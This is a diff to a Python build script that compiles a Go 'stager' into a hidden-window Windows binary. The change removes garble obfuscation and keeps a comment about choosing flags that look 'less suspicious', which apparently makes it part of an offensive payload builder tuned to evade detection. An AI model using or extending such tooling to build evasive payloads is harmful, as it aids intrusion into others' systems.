@@ -866,26 +866,13 @@ def stage_compile_stager(stager_dir, output_name):
     env["GOARCH"] = "amd64"
     env["CGO_ENABLED"] = "0"
 
-    # Try garble first, fall back to go build
-    compiler = "go"
-    if shutil.which("garble"):
-        compiler = "garble"
-        log("Using garble for compile-time obfuscation", "OK")
-
     # -w strips debug info but keeps symbol table (less suspicious than -s -w)
-    log(f"Compiling stager with {compiler} (windowsgui)...")
-    cmd = [compiler, "build", "-ldflags", "-w -H windowsgui", "-o", out_path, "."]
+    log("Compiling stager (windowsgui)...")
+    cmd = ["go", "build", "-ldflags", "-w -H windowsgui", "-o", out_path, "."]
     build = subprocess.run(cmd, cwd=stager_dir, capture_output=True, text=True, env=env)
 
     if build.returncode != 0:
-        if compiler == "garble":
-            log("Garble failed, falling back to go build...", "WARN")
-            cmd[0] = "go"
-            build = subprocess.run(cmd, cwd=stager_dir, capture_output=True, text=True, env=env)
-            if build.returncode != 0:
-                raise Exception(f"Stager build failed:\n{build.stderr}")
-        else:
-            raise Exception(f"Stager build failed:\n{build.stderr}")
+        raise Exception(f"Stager build failed:\n{build.stderr}")
 
     if os.path.exists(out_path):
         size = os.path.getsize(out_path)
